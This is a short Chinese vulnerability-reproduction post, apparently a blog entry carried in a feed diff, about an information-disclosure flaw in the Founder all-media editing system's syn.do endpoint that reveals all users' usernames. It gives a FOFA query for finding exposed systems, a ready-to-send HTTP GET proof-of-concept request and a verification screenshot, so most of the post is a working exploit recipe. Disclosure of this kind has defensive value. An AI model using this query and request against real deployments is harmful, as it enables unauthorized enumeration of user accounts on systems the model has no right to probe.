+<h2 id="1-漏洞介绍"><a class="markdownIt-Anchor" href="#1-漏洞介绍">#</a> 1、漏洞介绍</h2>
+<p>​	方正全媒体采编系统存在 syn.do 信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。</p>
+<h2 id="2-fofa语句"><a class="markdownIt-Anchor" href="#2-fofa语句">#</a> 2、 fofa 语句</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;FOUNDER-全媒体采编系统&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="3-poc"><a class="markdownIt-Anchor" href="#3-poc">#</a> 3、POC</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /newsedit/assess/syn.do?type=org HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Content-Length: 185Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<h2 id="4-验证"><a class="markdownIt-Anchor" href="#4-验证">#</a> 4、验证</h2>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png" alt="image.png"></p>
 ]]></content>
       <tags>
         <tag>漏洞复现</tag>
